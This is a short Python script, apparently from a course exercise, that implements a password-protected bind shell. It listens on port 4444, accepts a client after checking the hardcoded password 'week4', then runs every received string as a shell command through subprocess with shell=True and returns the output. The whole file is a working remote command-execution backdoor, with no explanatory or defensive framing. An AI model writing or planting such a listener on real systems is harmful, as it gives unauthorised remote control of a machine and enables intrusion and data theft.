import socket
from socket import error as SocketError
import subprocess

HOST = '127.0.0.1'
PORT = 4444

server = socket.socket()
server.bind((HOST, PORT))

def login():    
    print('[+] Server Started')
    print('[+] Listening for Client Connection...')
    server.settimeout(120)
    server.listen(1)

    global client, client_addr
    client, client_addr = server.accept()
    print('[+] Connection established, login attempt')
    
    while True:
        try:
            password = client.recv(1024).decode().strip()
            print(f'[*] Password received: {password}')
            
            if not password:
                print('[!] No password received. Closing connection.')
                client.close()
                return False
            
            if password == "week4":
                print('[+] Login Success')
                return True
            else:
                print('[-] Failed Login')
                client.close()
                return False
                
        except SocketError as se:
            print('[!] SocketError:', se)
            server.listen(1)
            client, client_addr = server.accept()
        except Exception as e:
            print('[!] Exception:', e)

login_status = False
while not login_status:
    login_status = login()

while True:
    try:
        print('[*] Awaiting Command...')
        command = client.recv(1024).decode().strip()

        if command == 'exit':
            continue

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        
        response = stdout + stderr

        if not response:
            client.send(b'no stdout')
        else:
            client.send(response)
    except Exception as e:
        print('[!] Main Loop Exception:', e)
        login_status = False
        while not login_status:
            login_status = login()

server.close()
print('[x] Connection Closed')
